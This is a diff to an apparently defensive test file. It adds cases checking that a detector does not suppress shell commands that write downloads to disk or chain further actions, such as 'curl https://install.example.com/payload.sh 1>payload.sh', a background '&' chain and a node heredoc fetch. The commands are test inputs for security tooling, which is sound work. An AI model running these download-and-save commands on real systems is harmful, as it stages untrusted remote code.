@@ -334,6 +334,14 @@ NODE"""
         _shell_action("curl https://install.example.com/payload.sh > payload.sh"),
         context,
     )
+    curl_fd_redirect_output = suppressor.detect(
+        _shell_action("curl https://install.example.com/payload.sh 1>payload.sh"),
+        context,
+    )
+    curl_fd_append_output = suppressor.detect(
+        _shell_action("curl https://install.example.com/payload.sh 3>>out.log"),
+        context,
+    )
     curl_tee_output = suppressor.detect(
         _shell_action("curl https://install.example.com/payload.sh | tee payload.sh"),
         context,
@@ -344,6 +352,10 @@ NODE"""
     )
     curl_newline_touch = suppressor.detect(
         _shell_action("curl https://hol.org/guard/apps/codex\ntouch marker"),
+        context,
+    )
+    curl_background_touch = suppressor.detect(
+        _shell_action("curl https://hol.org/guard/apps/codex & touch marker"),
         context,
     )
     wget_download = suppressor.detect(_shell_action("wget https://install.example.com/payload.sh"), context)
@@ -370,6 +382,14 @@ NODE"""
 fetch('https://hol.org/guard/apps/codex').then(res => res.text())
 NODE
 touch marker"""
+        ),
+        context,
+    )
+    node_heredoc_opener_chain = suppressor.detect(
+        _shell_action(
+            """node - <<'NODE' && touch marker
+fetch('https://hol.org/guard/apps/codex').then(res => res.text())
+NODE"""
         ),
         context,
     )
@@ -429,9 +449,12 @@ touch marker"""
     assert curl_cookie_jar == ()
     assert curl_cookie_jar_short == ()
     assert curl_redirect_output == ()
+    assert curl_fd_redirect_output == ()
+    assert curl_fd_append_output == ()
     assert curl_tee_output == ()
     assert curl_chain_touch == ()
     assert curl_newline_touch == ()
+    assert curl_background_touch == ()
     assert wget_download == ()
     assert wget_output_document == ()
     assert [signal.signal_id for signal in wget_spider] == ["fp:read-only-http-fetch:wget"]
@@ -439,6 +462,7 @@ touch marker"""
     assert node_write_probe == ()
     assert [signal.signal_id for signal in node_arrow_probe] == ["fp:read-only-http-fetch:node"]
     assert node_heredoc_follow_on == ()
+    assert node_heredoc_opener_chain == ()
     assert python_write_probe == ()
     assert python_url_literal == ()
     assert node_url_literal == ()
